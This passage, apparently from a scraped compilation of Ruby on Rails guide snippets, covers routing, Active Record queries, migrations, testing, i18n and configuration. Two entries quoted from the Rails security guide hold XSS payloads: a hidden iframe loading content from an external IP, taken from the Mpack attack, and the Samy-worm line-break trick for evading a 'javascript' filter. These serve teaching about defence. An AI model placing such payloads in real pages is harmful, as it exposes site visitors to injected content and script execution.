Request\nConnection: close\nDate: Sun, 24 Jan 2010 12:15:53 GMT\nTransfer-Encoding: chunked\nContent-Type: text/html; charset=utf-8\nX-Runtime: 0.013483\nSet-Cookie: _blog_session=...snip...; path=/; HttpOnly\nCache-Control: no-cache\n```\n\nLANGUAGE: http\nCODE:\n```\nHTTP/1.1 201 Created\nConnection: close\nDate: Sun, 24 Jan 2010 12:16:44 GMT\nTransfer-Encoding: chunked\nLocation: /photos/1\nContent-Type: text/html; charset=utf-8\nX-Runtime: 0.083496\nSet-Cookie: _blog_session=...snip...; path=/; HttpOnly\nCache-Control: no-cache\n```\n\n----------------------------------------\n\nTITLE: Accessing Query String Parameters\nDESCRIPTION: Example showing how to access query string parameters and POST parameters from the `params` hash within a controller action and use those parameters for finding clients.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/action_controller_overview.md#_snippet_2\n\nLANGUAGE: ruby\nCODE:\n```\nclass ClientsController < ApplicationController\n  # This action receives query string parameters from an HTTP GET request\n  # at the URL \"/clients?status=activated\"\n  def index\n    if params[:status] == \"activated\"\n      @clients = Client.activated\n    else\n      @clients = Client.inactivated\n    end\n  end\n\n  # This action receives parameters from a POST request to \"/clients\" URL with  form data in the request body.\n  def create\n    @client = Client.new(params[:client])\n    if @client.save\n      redirect_to @client\n    else\n      render \"new\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Configuring DigitalOcean Spaces S3-Compatible Service\nDESCRIPTION: YAML configuration for using DigitalOcean Spaces as an S3-compatible storage service.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_storage_overview.md#2025-04-23_snippet_5\n\nLANGUAGE: yaml\nCODE:\n```\ndigitalocean:\n  service: S3\n  endpoint: https://nyc3.digitaloceanspaces.com\n  access_key_id: <%= Rails.application.credentials.dig(:digitalocean, :access_key_id) %>\n  secret_access_key: <%= Rails.application.credentials.dig(:digitalocean, :secret_access_key) %>\n  # ...and other options\n```\n\n----------------------------------------\n\nTITLE: Retrieving multiple records using take in Rails\nDESCRIPTION: This code demonstrates how to retrieve multiple records from the `Customer` model using the `take` method with a numerical argument. It fetches the specified number of records without any specific ordering. The `take` method does not raise an exception if fewer records than requested are found; it returns the available records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_16\n\nLANGUAGE: irb\nCODE:\n```\nirb> customers = Customer.take(2)\n=> [#<Customer id: 1, first_name: \"Lifo\">, #<Customer id: 220, first_name: \"Sara\">]\n```\n\n----------------------------------------\n\nTITLE: SQL Query after Unscoping Order (SQL)\nDESCRIPTION: This SQL query is the result of the previous Ruby code snippet after the `unscope(:order)` method has been applied. It selects all columns from the `books` table where the `id` is greater than 100, limiting the result to 20 rows, without any specific ordering.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_100\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM books WHERE id > 100 LIMIT 20\n```\n\n----------------------------------------\n\nTITLE: Alternative Test Method Definition (Ruby)\nDESCRIPTION: This shows the equivalent of the `test` macro using a standard method definition. Methods starting with `test_` are automatically recognized and run as tests. This offers a more verbose but functionally identical way to define tests.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_6\n\nLANGUAGE: Ruby\nCODE:\n```\ndef test_the_truth\n  assert true\nend\n```\n\n----------------------------------------\n\nTITLE: Rendering Form with fields_for and index option in Rails\nDESCRIPTION: This snippet demonstrates how to use the `fields_for` helper in Rails to render a form with fields for each of a person's addresses, using the `:index` option to ensure that each address field has a unique name attribute. It iterates through a collection of addresses and generates input fields for the city attribute of each address.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/form_helpers.md#_snippet_73\n\nLANGUAGE: erb\nCODE:\n```\n<%= form_with model: @person do |person_form| %>\n  <%= person_form.text_field :name %>\n  <% @person.addresses.each do |address| %>\n    <%= person_form.fields_for address, index: address.id do |address_form| %>\n      <%= address_form.text_field :city %>\n    <% end %>\n  <% end %>\n<% end %>\n```\n\n----------------------------------------\n\nTITLE: HTML Video Tag with Multiple Sources Output\nDESCRIPTION: This code snippet shows the HTML output generated by the `video_tag` helper with multiple video sources.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_62\n\nLANGUAGE: html\nCODE:\n```\n<video>\n  <source src=\"/videos/trailer.ogg\">\n  <source src=\"/videos/movie.ogg\">\n</video>\n```\n\n----------------------------------------\n\nTITLE: Rails Exception Rescue Responses Configuration\nDESCRIPTION: This configuration allows mapping specific exceptions to HTTP status codes. It accepts a hash where keys are exception classes and values are the corresponding HTTP status codes. This enables customizing the response status for different error scenarios within the application.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/configuring.md#_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\n\n```\n\n----------------------------------------\n\nTITLE: Empty Migration File (Ruby)\nDESCRIPTION: This code represents the initial state of a newly generated, empty migration file. It includes the class definition inheriting from ActiveRecord::Migration and an empty change method.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_3\n\nLANGUAGE: ruby\nCODE:\n```\n# db/migrate/20240502101659_add_part_number_to_products.rb\nclass AddPartNumberToProducts < ActiveRecord::Migration[8.1]\n  def change\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Pluck limitations: immediate query and eager loading\nDESCRIPTION: Highlights the limitations of `pluck`, including its immediate query execution and triggering of eager loading even when unnecessary. Suggests using `unscope` to avoid unwanted eager loading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_198\n\nLANGUAGE: irb\nCODE:\n```\nirb> Customer.pluck(:first_name).limit(1)\nNoMethodError: undefined method `limit' for #<Array:0x007ff34d3ad6d8>\n\nirb> Customer.limit(1).pluck(:first_name)\n=> [\"David\"]\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> assoc = Customer.includes(:reviews)\nirb> assoc.pluck(:id)\nSELECT \"customers\".\"id\" FROM \"customers\" LEFT OUTER JOIN \"reviews\" ON \"reviews\".\"id\" = \"customers\".\"review_id\"\n```\n\nLANGUAGE: irb\nCODE:\n```\nirb> assoc.unscope(:includes).pluck(:id)\n```\n\n----------------------------------------\n\nTITLE: Querying with Composite Primary Key using #where\nDESCRIPTION: This snippet showcases how to use the `where` method with a tuple-like syntax to query based on a composite primary key. It provides an alternative way to specify conditions for composite key relations. The example finds products matching specific combinations of `store_id` and `sku`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nProduct.where(Product.primary_key => [[1, \"ABC98765\"], [7, \"ZZZ11111\"]])\n```\n\n----------------------------------------\n\nTITLE: Active Storage Attachment Behavior in Rails 6.0\nDESCRIPTION: Demonstration of how the has_many_attached association changes in Rails 6.0, where assigning to a collection of attachments replaces existing files, matching Active Record's behavior with collection associations.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_43\n\nLANGUAGE: ruby\nCODE:\n```\nuser.highlights.attach(filename: \"funky.jpg\")\nuser.highlights.count # => 1\n\nblob = ActiveStorage::Blob.create_after_upload!(filename: \"town.jpg\")\nuser.update!(highlights: [ blob ])\n\nuser.highlights.count # => 1\nuser.highlights.first.filename # => \"town.jpg\"\n```\n\n----------------------------------------\n\nTITLE: Hash Deep Transform Values Ruby\nDESCRIPTION: The `deep_transform_values` method returns a new hash with all values converted by a given block. The conversion is applied recursively to all nested hashes. `deep_transform_values!` modifies the original hash in place.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_133\n\nLANGUAGE: ruby\nCODE:\n```\nhash = { person: { name: \"Rob\", age: \"28\" } }\n\nhash.deep_transform_values { |value| value.to_s.upcase }\n# => {person: {name: \"ROB\", age: \"28\"}}\n```\n\n----------------------------------------\n\nTITLE: Malicious iframe injection for web page defacement\nDESCRIPTION: An example of malicious iframe code that loads external content to deface a web page. This snippet shows an actual attack vector from the Mpack attack framework used on legitimate Italian sites.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_42\n\nLANGUAGE: html\nCODE:\n```\n<iframe name=\"StatPage\" src=\"http://58.xx.xxx.xxx\" width=5 height=5 style=\"display:none\"></iframe>\n```\n\n----------------------------------------\n\nTITLE: Accessing cattr_accessor in Views\nDESCRIPTION: This Ruby code snippet shows an example where `cattr_accessor` is used in `ActionView::Base` to define a class attribute `field_error_proc` with a default Proc. It illustrates how instances can access and modify this class attribute, which is useful for accessing configurations in views.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_30\n\nLANGUAGE: ruby\nCODE:\n```\nmodule ActionView\n  class Base\n    cattr_accessor :field_error_proc, default: Proc.new {\n      # ...\n    }\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Hash Slice! Ruby\nDESCRIPTION: The `slice!` method modifies a hash, removing all keys except those specified. It returns a hash containing the removed key-value pairs. This is useful for extracting a subset of keys from a hash while modifying the original hash.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_core_extensions.md#_snippet_134\n\nLANGUAGE: ruby\nCODE:\n```\nhash = { a: 1, b: 2 }\nrest = hash.slice!(:a) # => {:b=>2}\nhash                   # => {:a=>1}\n```\n\n----------------------------------------\n\nTITLE: Real Example of Date Formats in YAML\nDESCRIPTION: A real-world example from the Active Support en.yml translations file showing how date formats are defined in YAML with default, short, and long format options.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_45\n\nLANGUAGE: yaml\nCODE:\n```\nen:\n  date:\n    formats:\n      default: \"%Y-%m-%d\"\n      short: \"%b %d\"\n      long: \"%B %d, %Y\"\n```\n\n----------------------------------------\n\nTITLE: Stylesheet Link Tag (Rails/ERB)\nDESCRIPTION: This example demonstrates how to include a CSS file named `main.css` in a Rails view using the `stylesheet_link_tag` helper. The file is expected to be in one of the assets directories.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_47\n\nLANGUAGE: erb\nCODE:\n```\n<%= stylesheet_link_tag \"main\" %>\n```\n\n----------------------------------------\n\nTITLE: Demonstrating Exception Handling in after_commit Callbacks in Rails\nDESCRIPTION: This example illustrates the behavior of `after_commit` callbacks when an exception is raised within one of them.  If an exception occurs in an `after_commit` callback, it will bubble up, and any subsequent `after_commit` callbacks will not be executed. The code shows that the second `after_commit` block will not be called if the first one raises an error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_callbacks.md#_snippet_38\n\nLANGUAGE: ruby\nCODE:\n```\nclass User < ActiveRecord::Base\n  after_commit { raise \"Intentional Error\" }\n  after_commit {\n    # This won't get called because the previous after_commit raises an exception\n    Rails.logger.info(\"This will not be logged\")\n  }\nend\n```\n\n----------------------------------------\n\nTITLE: Removing a Foreign Key (Specific Column)\nDESCRIPTION: This code removes a foreign key constraint specifying the column name. It removes the foreign key constraint on the `owner_id` column in the `accounts` table.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_migrations.md#_snippet_52\n\nLANGUAGE: ruby\nCODE:\n```\nremove_foreign_key :accounts, column: :owner_id\n```\n\n----------------------------------------\n\nTITLE: Defining Fixture Helper Methods\nDESCRIPTION: Example of defining helper methods for use in Active Record fixtures\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_80\n\nLANGUAGE: ruby\nCODE:\n```\nmodule FixtureFileHelpers\n  def file_sha(path)\n    OpenSSL::Digest::SHA256.hexdigest(File.read(Rails.root.join(\"test/fixtures\", path)))\n  end\nend\n\nActiveRecord::FixtureSet.context_class.include FixtureFileHelpers\n```\n\n----------------------------------------\n\nTITLE: Using instance-level respond_to in Rails Controllers\nDESCRIPTION: Example of a Rails controller using the instance-level respond_to method, which doesn't require the responders gem as it remains part of Rails core functionality.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_64\n\nLANGUAGE: ruby\nCODE:\n```\n# app/controllers/users_controller.rb\n\nclass UsersController < ApplicationController\n  def show\n    @user = User.find(params[:id])\n    respond_to do |format|\n      format.html\n      format.json { render json: @user }\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Updated belongs_to with Class Object\nDESCRIPTION: Ruby code showing how to update the belongs_to association when author_class returns a Class object instead of a String.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_51\n\nLANGUAGE: ruby\nCODE:\n```\nbelongs_to :author, class_name: Blorgh.author_class.to_s\n```\n\n----------------------------------------\n\nTITLE: Database Connection Pool Configuration\nDESCRIPTION: YAML configuration example for setting up database connection pooling with custom pool size and timeout values.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/2_2_release_notes.md#2025-04-23_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\ndevelopment:\n  adapter: mysql\n  username: root\n  database: sample_development\n  pool: 10\n  wait_timeout: 10\n```\n\n----------------------------------------\n\nTITLE: Configuring Autoload Once Paths in Rails Application\nDESCRIPTION: This snippet shows how to add directories to the autoload_once_paths configuration, which allows autoloading without reloading.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/autoloading_and_reloading_constants.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MyApplication\n  class Application < Rails::Application\n    config.autoload_once_paths << \"#{root}/app/serializers\"\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining a Custom Test Model Generator for Fallback in Ruby\nDESCRIPTION: Defines a simple `MyTestUnit::ModelGenerator` class within the `MyTestUnit` namespace. This generator is intended to override only the model-specific part of the `test_unit` generator framework, demonstrating the fallback mechanism.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/generators.md#2025-04-23_snippet_21\n\nLANGUAGE: ruby\nCODE:\n```\nmodule MyTestUnit\n  class ModelGenerator < Rails::Generators::NamedBase\n    source_root File.expand_path(\"templates\", __dir__)\n\n    def do_different_stuff\n      say \"Doing different stuff...\"\n    end\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Efficient Logging Using Blocks (Lazy Loading) in Ruby\nDESCRIPTION: Presents the recommended approach for logging in Ruby to optimize performance. By passing a block to the logger method (`logger.debug { ... }`), the code inside the block (including string interpolation) is only evaluated if the configured log level allows the message to be logged (lazy evaluation). This avoids unnecessary object creation and computation when the log message is ultimately suppressed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/debugging_rails_applications.md#2025-04-23_snippet_13\n\nLANGUAGE: ruby\nCODE:\n```\nlogger.debug { \"Person attributes hash: #{@person.attributes.inspect}\" }\n```\n\n----------------------------------------\n\nTITLE: Retrieving the last record with composite primary key\nDESCRIPTION: This code shows how to retrieve the last record when the model has a composite primary key. The records are ordered by the composite primary key columns in descending order.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_28\n\nLANGUAGE: irb\nCODE:\n```\nirb> customer = Customer.last\n=> #<Customer id: 221, store_id: 1, first_name: \"Lifo\">\n```\n\n----------------------------------------\n\nTITLE: Custom I18n Exception Handler Implementation\nDESCRIPTION: Demonstrates implementation of a custom exception handler for I18n that provides special handling for a specific translation key while maintaining default behavior for other cases.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/i18n.md#2025-04-23_snippet_48\n\nLANGUAGE: ruby\nCODE:\n```\n# config/initializers/i18n.rb\nmodule I18n\n  class RaiseExceptForSpecificKeyExceptionHandler\n    def call(exception, locale, key, options)\n      if key == \"special.key\"\n        \"translation missing!\" # return this, don't raise it\n      elsif exception.is_a?(MissingTranslation)\n        raise exception.to_exception\n      else\n        raise exception\n      end\n    end\n  end\nend\n\nI18n.exception_handler = I18n::RaiseExceptForSpecificKeyExceptionHandler.new\n```\n\n----------------------------------------\n\nTITLE: Line break technique to bypass JavaScript filtering\nDESCRIPTION: A technique using line breaks to bypass keyword filtering in CSS/JavaScript injection. This was used in the MySpace Samy worm to evade the 'javascript' keyword filter.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/security.md#2025-04-23_snippet_51\n\nLANGUAGE: html\nCODE:\n```\n<div id=\"mycode\" expr=\"alert('hah!')\" style=\"background:url('java↵script:eval(document.all.mycode.expr)')\">\n```\n\n----------------------------------------\n\nTITLE: Setting up Parameter Wrapping in Rails 3.1\nDESCRIPTION: Configuration for ActionController::ParamsWrapper in a new initializer file, which enables parameter wrapping for JSON and disables root elements in JSON by default.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_5\n\nLANGUAGE: ruby\nCODE:\n```\n# Be sure to restart your server when you modify this file.\n# This file contains settings for ActionController::ParamsWrapper which\n# is enabled by default.\n\n# Enable parameter wrapping for JSON. You can disable this by setting :format to an empty array.\nActiveSupport.on_load(:action_controller) do\n  wrap_parameters :format => [:json]\nend\n\n# Disable root element in JSON by default.\nActiveSupport.on_load(:active_record) do\n  self.include_root_in_json = false\nend\n```\n\n----------------------------------------\n\nTITLE: Example Cache Decrement Payload in ActiveSupport\nDESCRIPTION: Example of a payload structure for cache_decrement.active_support event showing the key, store class, and decrement amount when decrementing a counter in the cache.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_25\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  key: \"bottles-of-beer\",\n  store: \"ActiveSupport::Cache::RedisCacheStore\",\n  amount: 1\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Development Environment in Rails 3.2\nDESCRIPTION: Configuration settings for Rails 3.2 development environment, including mass assignment protection and query plan logging thresholds.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_2_release_notes.md#2025-04-23_snippet_0\n\nLANGUAGE: ruby\nCODE:\n```\n# Raise exception on mass assignment protection for Active Record models\nconfig.active_record.mass_assignment_sanitizer = :strict\n\n# Log the query plan for queries taking more than this (works\n# with SQLite, MySQL, and PostgreSQL)\nconfig.active_record.auto_explain_threshold_in_seconds = 0.5\n```\n\n----------------------------------------\n\nTITLE: SQL equivalent of ordering with composite primary key\nDESCRIPTION: This snippet displays the SQL query that Rails uses to order records when a composite primary key is defined. The `ORDER BY` clause includes all columns in the composite key, specifying the sort order for each column.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_composite_primary_keys.md#_snippet_5\n\nLANGUAGE: sql\nCODE:\n```\nSELECT * FROM products ORDER BY products.store_id ASC, products.sku ASC LIMIT 1\n```\n\n----------------------------------------\n\nTITLE: Adding Module Configuration for Author Class\nDESCRIPTION: Ruby code to add a module-level accessor for configuring the author class in the Blorgh engine.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/engines.md#2025-04-23_snippet_46\n\nLANGUAGE: ruby\nCODE:\n```\nmattr_accessor :author_class\n```\n\n----------------------------------------\n\nTITLE: Validating Model Instances in IRB\nDESCRIPTION: This snippet shows how to interact with a model instance in IRB and check its validity using the `valid?` method. It demonstrates how to set attribute values and observe the validation results, including the exception raised when using `validates!`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_35\n\nLANGUAGE: irb\nCODE:\n```\nirb> person = Person.new\nirb> person.token = \"2b1f325\"\nirb> person.valid?\n=> false\n\nirb> person.name = \"Jane Doe\"\nirb> person.email = \"me\"\nirb> person.valid?\n=> false\n\nirb> person.email = \"jane.doe@gmail.com\"\nirb> person.valid?\n=> true\n\n# `token` uses validate! and will raise an exception when not set.\nirb> person.token = nil\nirb> person.valid?\n=> \"Token can't be blank (ActiveModel::StrictValidationFailed)\"\n```\n\n----------------------------------------\n\nTITLE: Using Object#presence in Active Support\nDESCRIPTION: Example of the new Object#presence method which returns the object if it's present? otherwise returns nil.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_0_release_notes.md#2025-04-23_snippet_14\n\nLANGUAGE: ruby\nCODE:\n```\nObject#presence\n```\n\n----------------------------------------\n\nTITLE: External JavaScript Include (Rails/ERB)\nDESCRIPTION: This example demonstrates including a Javascript file from an external URL.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/layouts_and_rendering.md#_snippet_46\n\nLANGUAGE: erb\nCODE:\n```\n<%= javascript_include_tag \"http://example.com/main.js\" %>\n```\n\n----------------------------------------\n\nTITLE: Active Storage Blobs Fixture - YAML\nDESCRIPTION: This YAML fixture defines an Active Storage blob fixture named `first_thumbnail_blob` using `ActiveStorage::FixtureSet.blob`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_29\n\nLANGUAGE: yaml\nCODE:\n```\n# test/fixtures/active_storage/blobs.yml\nfirst_thumbnail_blob: <%= ActiveStorage::FixtureSet.blob filename: \"first.png\" %>\n```\n\n----------------------------------------\n\nTITLE: Using to_key in Active Model (IRB)\nDESCRIPTION: This snippet shows the usage of the `to_key` method. It returns an array of the object's key attributes if any are set, or nil if there are no key attributes.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_16\n\nLANGUAGE: irb\nCODE:\n```\nirb> person.to_key\n=> [1]\n```\n\n----------------------------------------\n\nTITLE: Handling ForbiddenAttributesError\nDESCRIPTION: This snippet demonstrates how to handle `ActiveModel::ForbiddenAttributesError` when assigning attributes using strong parameters. It shows how to permit attributes to avoid the error.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_12\n\nLANGUAGE: ruby\nCODE:\n```\nirb> person = Person.new\n\n# Using strong parameters checks, build a hash of attributes similar to params from a request\nirb> params = ActionController::Parameters.new(name: \"John\")\n=> #<ActionController::Parameters {\"name\" => \"John\"} permitted: false>\n\nirb> person.assign_attributes(params)\n=> # Raises ActiveModel::ForbiddenAttributesError\nirb> person.name\n=> nil\n\n# Permit the attributes we want to allow assignment\nirb> permitted_params = params.permit(:name)\n=> #<ActionController::Parameters {\"name\" => \"John\"} permitted: true>\n\nirb> person.assign_attributes(permitted_params)\nirb> person.name\n=> \"John\"\n```\n\n----------------------------------------\n\nTITLE: Using attribute_names Method\nDESCRIPTION: This snippet demonstrates the `attribute_names` method to get an array of attribute names defined using `ActiveModel::Attributes`.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_model_basics.md#_snippet_8\n\nLANGUAGE: ruby\nCODE:\n```\nirb> Person.attribute_names\n=> [\"name\", \"date_of_birth\", \"active\"]\n```\n\n----------------------------------------\n\nTITLE: Defining Payload for instantiation.active_record in Ruby\nDESCRIPTION: This snippet shows the payload for the `instantiation.active_record` event. The Ruby hash indicates the `:record_count` (number of records instantiated) and the `:class_name` of the instantiated records.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_support_instrumentation.md#2025-04-23_snippet_18\n\nLANGUAGE: ruby\nCODE:\n```\n{\n  record_count: 1,\n  class_name: \"User\"\n}\n```\n\n----------------------------------------\n\nTITLE: Using XHR for JavaScript responses in Rails tests\nDESCRIPTION: Example showing how to update Rails functional and integration tests to use xhr for JavaScript responses due to enhanced CSRF protection for GET requests with JavaScript responses.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_73\n\nLANGUAGE: ruby\nCODE:\n```\nxhr :get, :index, format: :js\n```\n\n----------------------------------------\n\nTITLE: Running Active Record Tests for MySQL (Trilogy) in Bash\nDESCRIPTION: Executes the Active Record test suite specifically using the `trilogy` adapter via the `test:trilogy` Rake task. Requires the MySQL test database to be built first.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/contributing_to_ruby_on_rails.md#2025-04-23_snippet_26\n\nLANGUAGE: bash\nCODE:\n```\n$ bundle exec rake test:trilogy\n```\n\n----------------------------------------\n\nTITLE: Unicode Route Definition Change in Rails 4.0\nDESCRIPTION: Rails 4.0 changed how unicode character routes are drawn. The example shows the old escaped format and the new direct format.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_96\n\nLANGUAGE: ruby\nCODE:\n```\nget Rack::Utils.escape(\"こんにちは\"), controller: \"welcome\", action: \"index\"\n```\n\nLANGUAGE: ruby\nCODE:\n```\nget \"こんにちは\", controller: \"welcome\", action: \"index\"\n```\n\n----------------------------------------\n\nTITLE: Shallow Nesting with a Shallow Block\nDESCRIPTION: This snippet shows how to use the `shallow` block to define a scope where all nested resources are shallow. This achieves the same result as specifying `:shallow` on each individual resource, providing an alternative way to define shallow nesting for multiple resources.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/routing.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nshallow do\n  resources :articles do\n    resources :comments\n    resources :quotes\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Defining Nested Routes (Rails)\nDESCRIPTION: This code snippet defines a nested route for subscribers within the products resource. This allows for creating subscribers associated with a specific product.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/getting_started.md#_snippet_103\n\nLANGUAGE: ruby\nCODE:\n```\n  resources :products do\n    resources :subscribers, only: [ :create ]\n  end\n```\n\n----------------------------------------\n\nTITLE: Adding dig Method to ActionDispatch::Request::Session in Ruby on Rails\nDESCRIPTION: Adds the #dig method to ActionDispatch::Request::Session, allowing nested key access in session data.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/6_0_release_notes.md#2025-04-23_snippet_1\n\nLANGUAGE: Ruby\nCODE:\n```\nActionDispatch::Request::Session#dig\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Cookie-Based Database Resolver - Ruby\nDESCRIPTION: This Ruby class 'MyCookieResolver' extends the default ActiveRecord database selector resolver to use request cookies for tracking last write timestamps instead of sessions. Required dependencies include Rails and the ActiveRecord::Middleware::DatabaseSelector module. Methods handle retrieval and update of write times; should be used when cookie-based tracking of database role selection is needed.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nclass MyCookieResolver < ActiveRecord::Middleware::DatabaseSelector::Resolver\n  def self.call(request)\n    new(request.cookies)\n  end\n\n  def initialize(cookies)\n    @cookies = cookies\n  end\n\n  attr_reader :cookies\n\n  def last_write_timestamp\n    self.class.convert_timestamp_to_time(cookies[:last_write])\n  end\n\n  def update_last_write_timestamp\n    cookies[:last_write] = self.class.convert_time_to_timestamp(Time.now)\n  end\n\n  def save(response)\n  end\nend\n```\n\n----------------------------------------\n\nTITLE: Asserting Email Content in Views - Ruby\nDESCRIPTION: This snippet demonstrates how to use `assert_dom_email` to make assertions about the content within an email body when testing views in Rails. It checks if a specific string exists within the `<small>` tag.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/testing.md#_snippet_89\n\nLANGUAGE: ruby\nCODE:\n```\nassert_dom_email do\n  assert_dom \"small\", \"Please click the 'Unsubscribe' link if you want to opt-out.\"\nend\n```\n\n----------------------------------------\n\nTITLE: Adding channel_prefix to Redis adapter in cable.yml\nDESCRIPTION: Supports adding a channel_prefix to Redis and evented Redis adapters in cable.yml to avoid name collisions when using the same Redis server with multiple applications.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/5_1_release_notes.md#2025-04-23_snippet_4\n\nLANGUAGE: YAML\nCODE:\n```\nproduction:\n  adapter: redis\n  url: <%= ENV.fetch(\"REDIS_URL\") { \"redis://localhost:6379/1\" } %>\n  channel_prefix: myapp_production\n```\n\n----------------------------------------\n\nTITLE: Bulk Schema Changes in Migrations\nDESCRIPTION: Demonstrates using the :bulk option in change_table to combine multiple schema changes into a single ALTER statement\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/3_1_release_notes.md#2025-04-23_snippet_16\n\nLANGUAGE: ruby\nCODE:\n```\nchange_table(:users, :bulk => true) do |t|\n  t.string :company_name\n  t.change :birthdate, :datetime\nend\n```\n\n----------------------------------------\n\nTITLE: Creating Database Table with SQL\nDESCRIPTION: SQL statement to create a books table with id, title, and author columns. The id column is set as the primary key with auto-increment enabled.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_basics.md#2025-04-23_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nCREATE TABLE books (\n  id int(11) NOT NULL auto_increment,\n  title varchar(255),\n  author varchar(255),\n  PRIMARY KEY  (id)\n);\n```\n\n----------------------------------------\n\nTITLE: SQL query generated by enum bang method in Rails\nDESCRIPTION: This SQL query shows the execution of the `order.shipped!` command. It updates the `status` of the order to the integer value associated with the `:shipped` enum, and also updates the `updated_at` timestamp.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_querying.md#_snippet_180\n\nLANGUAGE: sql\nCODE:\n```\nUPDATE \"orders\" SET \"status\" = ?, \"updated_at\" = ? WHERE \"orders\".\"id\" = ?  [[\"status\", 0], [\"updated_at\", \"2019-01-24 07:13:08.524320\"], [\"id\", 1]]\n```\n\n----------------------------------------\n\nTITLE: Secondary Database Model Implementation in Ruby\nDESCRIPTION: Example model class inheriting from AnimalsRecord for the animals database.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/active_record_multiple_databases.md#2025-04-23_snippet_6\n\nLANGUAGE: ruby\nCODE:\n```\nclass Dog < AnimalsRecord\n  # Talks automatically to the animals database.\nend\n```\n\n----------------------------------------\n\nTITLE: Caching Product Images with Variants in Ruby on Rails ERB\nDESCRIPTION: This ERB snippet demonstrates how to cache product images with variants in a Rails view, and how to invalidate the cache when upgrading Active Storage.\nSOURCE: https://github.com/rails/rails/blob/main/guides/source/upgrading_ruby_on_rails.md#2025-04-23_snippet_26\n\nLANGUAGE: erb\nCODE:\n```\n<% @products.each do |product| %>\n  <% cache [\"v2\", product] do %>\n    <%= image_tag product.cover_photo.variant(resize_to_limit: 